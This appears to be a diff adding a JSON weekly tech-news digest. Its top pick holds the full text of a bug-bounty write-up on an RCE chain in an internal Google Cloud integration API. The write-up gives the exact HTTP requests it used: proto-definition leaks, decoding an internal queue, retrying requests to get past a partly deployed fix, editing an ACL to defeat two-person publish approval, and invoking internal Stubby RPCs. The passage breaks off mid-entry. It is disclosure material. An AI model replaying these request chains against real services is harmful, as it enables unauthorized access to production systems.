@@ -1,0 +1,2203 @@
+{
+  "weekId": "2026-W21",
+  "rangeStart": "2026-05-18",
+  "rangeEnd": "2026-05-24",
+  "generatedAt": "2026-05-24T18:14:23.296Z",
+  "stats": {
+    "totalDays": 7,
+    "candidateArticles": 101,
+    "uniqueSources": 32
+  },
+  "topPicks": [
+    {
+      "slug": "c71677872bbca493",
+      "title": "StubZero: $148,337 RCE in Google Cloud Production",
+      "titleZh": "Google Cloud生产环境遭$148,337 RCE漏洞利用",
+      "link": "https://brutecat.com/articles/google-cloud-rce",
+      "sourceName": "brutecat.com",
+      "sourceUrl": "https://brutecat.com",
+      "pubDate": "2026-06-01T00:00:00.000Z",
+      "category": "security",
+      "keywords": [
+        "RCE",
+        "Google Cloud",
+        "Discord",
+        "vulnerability"
+      ],
+      "score": {
+        "relevance": 9,
+        "quality": 9,
+        "timeliness": 10,
+        "total": 28
+      },
+      "summary": "文章描述了一起发生在Google Cloud生产环境的远程代码执行（RCE）安全事件，攻击者通过信息泄露和组合缺失的漏洞组件，在一小时内成功利用漏洞。三个月后类似事件再次发生。漏洞涉及金额高达14.8万美元，凸显了云环境配置错误和快速响应的重要性。",
+      "summaryEn": "This article details a $148,337 Remote Code Execution (RCE) vulnerability exploited in Google Cloud production environments. Attackers leveraged information disclosure and missing components to achieve RCE within one hour—a similar incident occurred again three months later. The case underscores critical issues of misconfigurations and rapid response in cloud security.",
+      "reason": "揭示了云环境中因配置错误导致的严重漏洞及重复风险，对云安全从业者极具警示意义。",
+      "fullTextStatus": "ok",
+      "fullText": {
+        "byline": "Arvin Shivram",
+        "siteName": "Brutecat Security",
+        "partial": false,
+        "blocks": [
+          {
+            "type": "p",
+            "text": "What started as a debugging endpoint info leak escalated into full remote code execution on Google Cloud's production environment. Three months later, it happened again. This vulnerability was assigned CVE-2026-2031."
+          },
+          {
+            "type": "p",
+            "text": "This story starts with one of my automated fuzzing tools alerting me about the API cloudcrmipfrontend-pa.googleapis.com, as it was responding with status 200 to some suspicious endpoints. On further inspection, the API seems to have several public debugging endpoints:"
+          },
+          {
+            "type": "p",
+            "text": "Screenshot from an internal API explorer tool I built for testing internal Google APIs from a discovery document"
+          },
+          {
+            "type": "h3",
+            "text": "req2proto as a Service™"
+          },
+          {
+            "type": "p",
+            "text": "Some of the endpoints like GET /v1/integrationPlatform:listServicesByServer seemed to always return internal server error. However, the endpoint /v1/integrationPlatform:getProtoDefinition seemed to return the proto definitions of any protobuf message in google3 (google's internal source code monorepo), even for unrelated services like YouTube."
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE"
+          },
+          {
+            "type": "quote",
+            "text": "For authentication with this API, we are using Google's proprietary first-party authentication. This involves your Google account cookie header along with an Authorization header value calculated using the SAPISID cookie as well as the whitelisted origin https://console.cloud.google.com"
+          },
+          {
+            "type": "p",
+            "text": "Response"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"protoDescriptor\": {\n    \"name\": \"InnerTubeContext\",\n    \"field\": [\n      {\n        \"name\": \"client\",\n        \"number\": 1,\n        \"label\": \"LABEL_OPTIONAL\",\n        \"type\": \"TYPE_MESSAGE\",\n        \"typeName\": \".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo\",\n        \"jsonName\": \"client\"\n      },\n      {\n        \"name\": \"user\",\n        \"number\": 3,\n        \"label\": \"LABEL_OPTIONAL\",\n        \"type\": \"TYPE_MESSAGE\",\n        \"typeName\": \".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo\",\n        \"jsonName\": \"user\"\n      },\n..."
+          },
+          {
+            "type": "p",
+            "text": "This was massive, because in Google, everything is proto. All APIs are defined internally as gRPC services using protobuf, and this would essentially allow for disclosing the request/response body of any endpoint, which for a blackbox target like Google is a gold mine."
+          },
+          {
+            "type": "p",
+            "text": "In the past, I had developed a tool req2proto for this purpose, however that tool was limited only to finding the request body proto, not the response body, and it was also with the assumption that the API supported JSPB (application/json+protobuf) which most APIs didn't. As a joke, my friends and I started referring to this endpoint from then onwards as \"req2proto as a service\", since it was quite literally a hosted, much more powerful version of the tool."
+          },
+          {
+            "type": "p",
+            "text": "Before probing further with this endpoint, I checked if there were any other endpoints leaking information."
+          },
+          {
+            "type": "h3",
+            "text": "Leaking internal workflow execution queue"
+          },
+          {
+            "type": "p",
+            "text": "Initially, without any query parameters set, this endpoint was just returning INVALID_ARGUMENT errors. Trying filters like * also didn't work. However, from past experience, these filter parameters usually allow any filtering in accordance with https://google.aip.dev/160"
+          },
+          {
+            "type": "p",
+            "text": "As such, upon trying client_id>\"123\" as the filter, I got an interesting response:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"error\": {\n    \"code\": 500,\n    \"message\": \"Failed to convert server response to JSON\",\n    \"status\": \"INTERNAL\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "It looks like whatever response it was trying to give to me didn't have a JSON mapping. However, Google APIs support changing the response content-type via the standard ?alt= parameter. For instance, ?alt=proto would return the output in protobuf."
+          },
+          {
+            "type": "p",
+            "text": "The only issue is that since we are using Google's proprietary first-party auth for authentication (Cookie and Authorization header), we have to send requests to the hostname cloudcrmipfrontend-pa.clients6.google.com instead of cloudcrmipfrontend-pa.googleapis.com, but Google does not allow raw proto responses to requests sent to *.google.com:"
+          },
+          {
+            "type": "code",
+            "text": "Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com"
+          },
+          {
+            "type": "p",
+            "text": "Thankfully, there's a way around this. We can use the header X-Goog-Encode-Response-If-Executable: base64 and this would get the response back in base64 instead of binary data:"
+          },
+          {
+            "type": "code",
+            "text": "GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nX-Goog-Encode-Response-If-Executable: base64"
+          },
+          {
+            "type": "p",
+            "text": "The API returned a large base64 protobuf response. Using the proto definition leak from earlier to retrieve the schema for ListQuotaQueueResponse, I was able to decode it properly which revealed that this was some sort of internal workflow execution queue, which included workflows syncing data from Spanner to Salesforce:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"queue_items\": [\n    {\n      \"queued_request\": {\n        \"queued_request_id\": \"75a885e2-c611-43f7-b4e2-ae0d87bae789\",\n        \"client_id\": \"default\",\n        \"workflow_name\": \"WriteToSfdc\",\n        \"priority\": \"CRITICAL\",\n        \"received_timestamp\": 1763057385562,\n        \"event_execution_info_id\": \"615cd9a9-9c0e-46ec-90df-91ee42ec9c37\"\n      },\n      \"event_execution_info\": {\n        \"client_id\": \"default\",\n        \"workflow_name\": \"WriteToSfdc\",\n        \"trigger_id\": \"api_trigger/WriteToSfdc\",\n        ...\n        \"type_url\": \"type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest\",\n        ...\n        \"sfdc_object\": {\n          \"vector_account\": {\n            \"id\": \"001Kf00000wjeK3IAI\",\n            \"due_diligence__c\": \"Pending\",\n            \"due_diligence_sub_status__c\": \"1. PENDING DD - Initial Submission Review\"\n            ..."
+          },
+          {
+            "type": "p",
+            "text": "Shortly after this, I filed a report for these vulnerabilities. Just a few hours later, it was marked as P0/S0 and got a 🎉 Nice catch!"
+          },
+          {
+            "type": "h3",
+            "text": "Escalating further?"
+          },
+          {
+            "type": "p",
+            "text": "After all this, I was convinced there was likely more to be found in this API, so I started looking at all the workflow endpoints. The API seemed to be related to Google Cloud's Application Integration."
+          },
+          {
+            "type": "p",
+            "text": "It allows you to define a \"workflow\", that you could supply with a triggerConfig for what should trigger the workflow, as well as taskConfig for what task should be triggered. The most interesting part was that looking at the discovery document, there seemed to be hints of a task called GenericStubbyTypedTask that you seemingly could configure the workflow to execute, which instantly set off red flags."
+          },
+          {
+            "type": "code",
+            "text": "\"EnterpriseCrmEventbusProtoTaskUiModuleConfig\": {\n  \"description\": \"Task author would use this type to configure a config module.\",\n  \"id\": \"EnterpriseCrmEventbusProtoTaskUiModuleConfig\",\n  \"properties\": {\n    \"moduleId\": {\n      \"description\": \"ID of the config module.\",\n      \"enum\": [\n        ...\n        \"RPC_TYPED\",\n        ...\n      ],\n      \"enumDescriptions\": [\n        ...\n        \"Configures a GenericStubbyTypedTask.\",\n        ...\n      ],\n    }\n  }\n},"
+          },
+          {
+            "type": "p",
+            "text": "From Google's SRE book:"
+          },
+          {
+            "type": "quote",
+            "text": "All of Google’s services communicate using a Remote Procedure Call (RPC) infrastructure named Stubby; an open source version, gRPC, is available. Often, an RPC call is made even when a call to a subroutine in the local program needs to be performed. This makes it easier to refactor the call into a different server if more modularity is needed, or when a server’s codebase grows."
+          },
+          {
+            "type": "p",
+            "text": "From my understanding on how this works, Borg (aka Google Production) follows a security model where every borgtask service has its own identity. When you send a request to a *.googleapis.com endpoint, the frontend service makes Stubby calls to backend services using its own prod service identity, while carrying your end-user context in a security ticket. If the ticket contains your Gaia user ID, backend services authorize the request as that user. Here are two examples of leaked security tickets from Google API error responses:"
+          },
+          {
+            "type": "code",
+            "text": "com.google.apps.framework.auth.IamPermissionDeniedException:\n  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'\n  required for action PrivateCatalogV1Beta1-SearchProducts\n  on resource ''.Explanation:"
+          },
+          {
+            "type": "code",
+            "text": "com.google.apps.framework.auth.IamPermissionDeniedException:\n  IAM authority does not have the permission 'resourcemanager.projects.get'\n  required for action GetServiceAccessStatus\n  on resource 'projects/613988253758'.Explanation:"
+          },
+          {
+            "type": "p",
+            "text": "In both cases, the peer block shows the prod service identity making the internal Stubby call. The difference is in the end-user context: the first ticket is ANONYMOUS, while the second carries a GAIA_MINT credential (when you use cookie or bearer authentication in Google, it's converted to a standard UberMint token which contains an embedded GaiaMint) meaning the backend authorizes the request as that Gaia user. This is so that a call to lets say /ContactsService.ListContacts only returns contacts for that authorized user."
+          },
+          {
+            "type": "p",
+            "text": "If we can perform arbitrary Stubby queries as the integration platform's prod service identity, this would allow us to access a wide variety of RPCs ranging from sensitive user data to code execution depending on the privileges of the prod user. Hence, Google considers this as a massive increase in attack surface and hence considers this an RCE."
+          },
+          {
+            "type": "p",
+            "text": "Often times, even if you can get code execution in a borglet, unless you're particularly interested in what data is processed locally, the main impact is actually access to all of production via Stubby RPCs."
+          },
+          {
+            "type": "p",
+            "text": "But what actually gates which RPCs you can call from a stolen Stubby primitive? Every Stubby service in Google has a defined RpcSecurityPolicy with a per-method allowlist. Here's a real one example from the Cloud SQL Speckle Boss process:"
+          },
+          {
+            "type": "code",
+            "text": "mapping {\n  rpc_method: \"/SaasActuation.UpdateInstance\"\n  rpc_method: \"/MaintenancePolicyService.CreateMaintenancePolicy\"\n  ...\n  authentication_policy {\n    creds_policy {\n      rules {\n        permissions: \"auth.creds.useProdUserEUC\"\n        action: ALLOW\n        in: \"mdb:zamm-exe-3-cloud-sql--default-policy\"\n        in: \"user:speckle-tool-proxy@prod.google.com\"\n      }\n      rules {\n        permissions: \"auth.creds.useLOAS\"\n        action: ALLOW\n        in: \"allUsers\"\n      }\n    }\n  }\n  authorization_mode: MANUAL_IAM\n  permission_to_check: \"cloudsql.instances.rollout\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "Each mapping block lists a set of RPC methods and declares which callers are allowed to invoke them under which credential type. Based on my understanding, auth.creds.useLOAS means \"any borgtask can call this with its own LOAS identity\" while auth.creds.useProdUserEUC means \"only these specific MDB groups are allowed to forward a Gaia end-user identity (i.e. an UberMint token) into the call\"."
+          },
+          {
+            "type": "quote",
+            "text": "LOAS (Low Overhead Authentication System) is Google's internal authentication & encryption framework, see this paper for more information"
+          },
+          {
+            "type": "p",
+            "text": "The permission_to_check then tells the backend which IAM permission to enforce on whatever identity ends up resolved."
+          },
+          {
+            "type": "p",
+            "text": "So even with a stolen Stubby primitive, you don't actually get to call every RPC under the sun. You can only reach the ones whose RpcSecurityPolicy lets your peer identity through. Nevertheless, it is a massive increase in reachable attack surface."
+          },
+          {
+            "type": "p",
+            "text": "When I initially tried to create a workflow, I got the following INVALID_ARGUMENT error:"
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 197\n\n{\n  \"workflow\": {\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"triggerConfigs\": [],\n    \"taskConfigs\": []\n  },\n  \"isNewWorkflow\": true\n}"
+          },
+          {
+            "type": "p",
+            "text": "Response"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Request contains an invalid argument.\",\n    \"status\": \"INVALID_ARGUMENT\"\n  }\n}"
+          },
+          {
+            "type": "quote",
+            "text": "Fun fact: If this request was sent from within Google's intranet, it would dump the full stack trace instead of just a generic error like this."
+          },
+          {
+            "type": "p",
+            "text": "I suspected that I was likely missing a required argument, possibly clientId. Remembering that the listQuotaQueue response from earlier had leaked \"client_id\": \"default\", I tried setting that as the clientId, and it worked:"
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform:createDraftWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 197\n\n{\n  \"workflow\": {\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"clientId\": \"default\",\n    \"triggerConfigs\": [],\n    \"taskConfigs\": []\n  },\n  \"isNewWorkflow\": true\n}"
+          },
+          {
+            "type": "p",
+            "text": "Response:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"workflow\": {\n    \"workflowId\": \"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e\",\n    \"name\": \"my-new-workflow-test\",\n    \"origin\": \"UI\",\n    \"creatorEmail\": \"admin@gvrptest.cry.dev\",\n    \"createdTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"lastModifiedTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"status\": \"DRAFT\",\n    \"snapshotNumber\": \"1\",\n    \"tags\": [\n      \"HEAD\"\n    ],\n    \"lockedBy\": \"admin@gvrptest.cry.dev\",\n    \"lockedAtTime\": \"2025-12-01T04:19:14.449503Z\",\n    \"lastModifierEmail\": \"admin@gvrptest.cry.dev\",\n    \"clientId\": \"default\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "However, it seemed in order to run a workflow, you had to publish it first, but that's where I got stuck:"
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform:publishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: SAPISIDHASH <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\n\n{\n  \"workflowId\": \"53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e\"\n}"
+          },
+          {
+            "type": "p",
+            "text": "Response"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.\",\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "I had to somehow add another user to the workflow, and use that to publish. At the time, I attempted to use the ACL endpoints to add another account, but wasn't able to get the permissions to work correctly."
+          },
+          {
+            "type": "h3",
+            "text": "The DM that changed everything"
+          },
+          {
+            "type": "p",
+            "text": "More than a month after I initially reported it, I was in a discord group chat with a few other researchers, where I jokingly mentioned that I had a bug to leak protobuf definitions within Google:"
+          },
+          {
+            "type": "p",
+            "text": "That's when shrugged mentioned that he had the same bug, and our conversation took off."
+          },
+          {
+            "type": "p",
+            "text": "It turned out that shrugged had also been investigating this very same API when he noticed these endpoints listed in the javascript files for Application Integration while researching another bug. He had spotted GenericStubbyTypedTask as a potential RCE vector, but was stuck without a valid client_id for the initial draft workflow creation."
+          },
+          {
+            "type": "p",
+            "text": "Meanwhile, I had the client_id from the quota queue leak, but was stuck at the publishing step. We quickly traded notes: I shared client_id: \"default\" and where I'd hit the wall, and we picked up from there."
+          },
+          {
+            "type": "p",
+            "text": "Google had already rolled out fixes from my initial report, so many of the original endpoints were now returning PERMISSION_DENIED. However, we noticed something interesting - many endpoints had 1:1 working counterparts under different service names:"
+          },
+          {
+            "type": "p",
+            "text": "The initial fixes had only blocked the original \"WorkflowEditorService\" endpoints, but not these counterparts. The problem was createDraftWorkflow - we couldn't find a counterpart for it, and it was returning PERMISSION_DENIED:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"The caller does not have permission\",\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "Strangely, when shrugged tried the same request, it worked on his first attempt, while I was consistently getting PERMISSION_DENIED. That's when it clicked: the fix hadn't fully propagated across all load balanced backends yet. By repeatedly sending the same request, we could reliably route through a backend that still allowed it through:"
+          },
+          {
+            "type": "code",
+            "text": "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{ \"workflow\": { \"workflowId\": \"c6141c63-ac7a-4350-b582-7615ef045d0c\", \"name\": \"retest\", \"origin\": \"UI\", \"creatorEmail\": \"admin@gvrptest.cry.dev\", \"createdTime\": \"...\", \"lastModifiedTime\": \"...\", \"status\": \"DRAFT\", \"snapshotNumber\": \"1\", \"tags\": [ \"HEAD\" ], \"lockedBy\": \"admin@gvrptest.cry.dev\", \"lockedAtTime\": \"...\", \"lastModifierEmail\": \"admin@gvrptest.cry.dev\", \"clientId\": \"default\" } }"
+          },
+          {
+            "type": "p",
+            "text": "However, the task name GenericStubbyTypedTask didn't seem to exist. Looking at the response of /v1/integrationPlatform:listTaskEntities (decoded using the proto definitions from getProtoDefinition), it seemed to only provide tasks with IO_TEMPLATE"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"taskEntities\": [\n    {\n      \"metadata\": {\n        \"name\": \"Delete SFDC Record\",\n        \"descriptiveName\": \"Delete Salesforce Record\",\n        \"description\": \"Deletes a record in Salesforce\",\n        \"g3DocLink\": \"https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task\",\n        \"iconLink\": \"https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg\",\n        \"codeSearchLink\": \"https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java\",\n      ...\n      },\n      \"paramSpecs\": {\n        \"parameters\": [\n          {\n            \"key\": \"salesforceDomain\",\n            \"dataType\": \"STRING_VALUE\",\n            \"className\": \"java.lang.String\",\n            \"config\": {\n              \"descriptivePhrase\": \"Check in Salesforce: Setup > Company Settings > My Domain. If you don't have My Domain enabled, please use \\\"yourinstance.salesforce.com\\\" as the Salesforce domain.\",\n              \"label\": \"Salesforce domain\",\n              \"uiPlaceholderText\": \"e.g. yourDomain.my.salesforce.com\"\n            },\n            \"required\": 1\n          },\n        ...\n        ]\n      },\n      ...\n      \"taskType\": \"IO_TEMPLATE\"\n    },\n    ...\n  ]\n}"
+          },
+          {
+            "type": "p",
+            "text": "It seemed like the GenericStubbyTypedTask was likely part of the underlying ASIS_TEMPLATE:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"taskType\": {\n      \"description\": \"Defines the type of the task\",\n      \"enum\": [\n        \"TASK\",\n        \"ASIS_TEMPLATE\",\n        \"IO_TEMPLATE\"\n      ],\n      \"enumDescriptions\": [\n        \"Normal IP task\",\n        \"Task is of As-Is Template type\",\n        \"Task is of I/O template type with a different underlying task\"\n      ],\n      \"type\": \"string\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "Interestingly, the underlying RPC for this endpoint is google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities. This is eerily similar to the public Application Integration product's /$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities though that too didn't return any ASIS_TEMPLATE tasks directly."
+          },
+          {
+            "type": "p",
+            "text": "Looking back at Application Integration's JS code from Cloud Console:"
+          },
+          {
+            "type": "code",
+            "text": "[\"Vertex AI - Predict\",\"https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png\"],\n[\"GenericStubbyTypedTaskV2\",\"http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg\"],\n[\"RunGoogleSqlPlxQueryTask\",\"https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg\"],\n[\"ConvertDremelResultToJsonTask\",\"https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png\"],"
+          },
+          {
+            "type": "p",
+            "text": "The exact task name was GenericStubbyTypedTaskV2, complete with its own icon, no less:"
+          },
+          {
+            "type": "p",
+            "text": "Attempting to configure GenericStubbyTypedTask on Application Integration returned an error revealing the required fields:"
+          },
+          {
+            "type": "code",
+            "text": "{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'\",\n    \"status\": \"INVALID_ARGUMENT\"\n  }\n}"
+          },
+          {
+            "type": "p",
+            "text": "Repeating with each missing key revealed serverSpec, serviceName, and serviceMethod. These same parameters applied to GenericStubbyTypedTaskV2. Using Ezequiel Pereira's protobuf repo as reference and a GSLB address we found leaked in another discovery document, we configured the task to call /ServerStatus.GetServices on gslb:alkali-base:"
+          },
+          {
+            "type": "quote",
+            "text": "Fun fact: Alkali is Google's internal framework that Googlers can use to spin up production APIs with minimal boilerplate, they tend to have a lot of security issues."
+          },
+          {
+            "type": "code",
+            "text": "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{\"workflow\": {\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\", \"name\": \"retest-test123\", \"taskConfigs\": [{\"taskName\": \"GenericStubbyTypedTaskV2\", \"taskNumber\": \"1\", \"parameters\": {\"response\": {\"key\": \"response\", \"value\": {\"stringValue\": \"$response$\"}, \"dataType\": \"STRING_VALUE\"}, \"serverSpec\": {\"key\": \"serverSpec\", \"value\": {\"stringValue\": \"gslb:alkali-base\"}, \"dataType\": \"STRING_VALUE\"}, \"serviceName\": {\"key\": \"serviceName\", \"value\": {\"stringValue\": \"ServerStatus\"}, \"dataType\": \"STRING_VALUE\"}, \"serviceMethod\": {\"key\": \"serviceMethod\", \"value\": {\"stringValue\": \"GetServices\"}, \"dataType\": \"STRING_VALUE\"}}, \"position\": {\"x\": -716, \"y\": -445}, \"label\": \"Stubby Internal\", \"incomingEdgeCount\": 1, \"taskType\": \"ASIS_TEMPLATE\", \"externalTaskType\": \"NORMAL_TASK\"}], \"triggerConfigs\": [{\"startTasks\": [{\"taskNumber\": \"1\"}], \"properties\": {\"Trigger name\": \"my-api-trigger-123\"}, \"triggerType\": \"API\", \"triggerNumber\": \"1\", \"enabledClients\": [\"default\"], \"triggerId\": \"api_trigger/my-api-trigger-123\"}], \"origin\": \"UI\", \"creatorEmail\": \"<REDACTED>\", \"createdTime\": \"2026-01-12T09:45:55.896951Z\", \"lastModifiedTime\": \"2026-01-12T09:45:55.896951Z\", \"status\": \"DRAFT\", \"snapshotNumber\": \"1\", \"tags\": [\"HEAD\"], \"lockedBy\": \"<REDACTED>\", \"lockedAtTime\": \"2026-01-12T09:45:55.896951Z\", \"lastModifierEmail\": \"<REDACTED>\", \"clientId\": \"default\"}}"
+          },
+          {
+            "type": "p",
+            "text": "Everything here is strikingly similar to Application Integration - the workflow structure, the task configuration, even the publishing and running flow. Notice the \"position\": {\"x\": -716, \"y\": -445} in our workflow? The internal UI likely looks very similar to Application Integration's visual workflow editor, where we're essentially setting coordinates for task positions:"
+          },
+          {
+            "type": "p",
+            "text": "Remember the ACL issue that blocked me from publishing earlier? shrugged figured out we could bypass it by updating the ACL for IP_EVENTBUS_WORKFLOWS with the obfuscated Gaia ID of two attacker controlled Google accounts."
+          },
+          {
+            "type": "p",
+            "text": "Request"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform/auth:setAcl HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\nCookie: <redacted>\nAuthorization: <redacted>\nOrigin: https://console.cloud.google.com\nX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE\nContent-Type: application/json\nContent-Length: 500\n\n{\"resourceInfo\": {\"resource\": \"IP_EVENTBUS_WORKFLOWS\", \"id\": \"retest-test123\"}, \"acl\": {\"entries\": [{\"scope\": {\"obfuscatedGaiaId\": \"100029910836469267942\"}, \"role\": 105}, {\"scope\": {\"obfuscatedGaiaId\": \"113728935872649341310\"}, \"role\": 105}]}}"
+          },
+          {
+            "type": "p",
+            "text": "Response"
+          },
+          {
+            "type": "code",
+            "text": "HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\n\n{}"
+          },
+          {
+            "type": "p",
+            "text": "First, we toggled the request to publish workflow using the first attacker Google account:"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\n...\n\n{\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\"}"
+          },
+          {
+            "type": "p",
+            "text": "And then finally publishing the workflow using the second attacker account:"
+          },
+          {
+            "type": "code",
+            "text": "POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2\nHost: cloudcrmipfrontend-pa.clients6.google.com\n...\n\n{\"workflowId\": \"f91833bf-eacb-43ac-8490-099fef977e19\"}"
+          },
+          {
+            "type": "p",
+            "text": "Running a workflow configured with GenericStubbyTypedTaskV2 with serverSpec set to gslb:alkali-base and service/method set to /ServerStatus.GetServices, we were able to execute the Stubby query:"
+          },
+          {
+            "type": "code",
+            "text": "...\n{\n    \"protoValue\": {\n    \"@type\": \"type.googleapis.com/rpc.ServiceList\",\n    \"service\": [\n        {\n        \"name\": \"AlkaliBaseAccountService\",\n        \"descriptor\": {\n            \"filename\": \"google/internal/alkali/base/v1/alkali_base_account_service.proto\",\n            \"name\": \"AlkaliBaseAccountService\",\n            \"method\": [\n            {\n                \"name\": \"ListAccounts\",\n                \"argumentType\": \"google.internal.alkali.base.v1.ListAccountsRequest\",\n                \"resultType\": \"google.internal.alkali.base.v1.ListAccountsResponse\",\n                \"deadline\": 30,\n                \"securityLevel\": \"none\"\n            },\n            {\n                \"name\": \"ListAccessibleAccounts\",\n                \"argumentType\": \"google.internal.alkali.base.v1.ListAccessibleAccountsRequest\",\n                \"resultType\": \"google.internal.alkali.base.v1.ListAccountsResponse\",\n                \"deadline\": 30,\n                \"securityLevel\": \"none\"\n            },\n            ..."
+          },
+          {
+            "type": "p",
+            "text": "We then updated the initial bug with the escalation to RCE. Neither of us could have done this alone, and the timing was clutch: just one hour after our PoC, the fix for createDraftWorkflow fully propagated. Any later and this RCE escalation would've stayed theoretical. That being said, we were cut off by Google before we could actually execute code on Google's servers."
+          },
+          {
+            "type": "h3",
+            "text": "Timeline (1st RCE)"
+          },
+          {
+            "type": "li",
+            "text": "2025-12-01 - Initial report sent to Google"
+          },
+          {
+            "type": "li",
+            "text": "2025-12-01 - Google triaged report as P0/S0"
+          },
+          {
+            "type": "li",
+            "text": "2025-12-01 - 🎉 Nice catch!"
+          },
+          {
+            "type": "li",
+            "text": "2026-01-12 - Informed Google's security team about the RCE escalation"
+          },
+          {
+            "type": "li",
+            "text": "2026-01-12 - Updated report with RCE PoC"
+          },
+          {
+            "type": "li",
+            "text": "2026-01-12 - Report escalated by Google"
+          },
+          {
+            "type": "li",
+            "text": "2026-01-16 - Panel awards $60,000. Rationale for this decision: This report was of exceptional quality! Vulnerability category is \"Compromise of Google Cloud Production Environment\". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products."
+          },
+          {
+            "type": "h3",
+            "text": "Round 2 (3 months later)"
+          },
+          {
+            "type": "p",
+            "text": "You thought that was the end of it, not so easy. Three months later, my fuzzer pinged me about some IDORs in the public Application Integration product's public API."
+          },
+          {
+            "type": "p",
+            "text": "Turns out, throughout this whole API, you could reference your own project ID in the URL, but reference someone else's UUID:"
+          },
+          {
+            "type": "code",
